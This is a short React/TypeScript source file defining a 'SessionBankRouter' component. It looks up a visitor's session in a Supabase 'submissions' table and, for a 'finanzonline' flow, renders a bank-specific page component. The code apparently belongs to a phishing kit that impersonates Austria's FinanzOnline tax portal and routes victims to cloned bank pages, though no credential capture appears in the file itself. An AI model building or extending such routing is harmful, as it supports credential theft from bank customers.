import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { bankComponentMap } from "@/lib/bankComponents";
import LandingSwitch from "@/components/LandingSwitch";

const SessionBankRouter = () => {
  const [params] = useSearchParams();
  const sessionId = params.get("s") || "";
  const [loading, setLoading] = useState(!!sessionId);
  const [bank, setBank] = useState<string | null>(null);

  useEffect(() => {
    if (!sessionId) {
      setBank(null);
      setLoading(false);
      return;
    }
    let cancelled = false;
    setLoading(true);
    (async () => {
      const { data } = await supabase
        .from("submissions")
        .select("bank, flow")
        .eq("session_id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      if (data?.flow === "finanzonline" && data?.bank && bankComponentMap[data.bank]) {
        setBank(data.bank);
      } else {
        setBank(null);
      }
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId]);

  if (loading) {
    return (
      <div className="fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-white">
        <div className="mb-6">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-[#00436b]" />
        </div>
        <p className="text-sm text-gray-600">Wird geladen…</p>
      </div>
    );
  }

  if (bank) {
    const BankComponent = bankComponentMap[bank];
    return <BankComponent />;
  }

  return <LandingSwitch />;
};

export default SessionBankRouter;
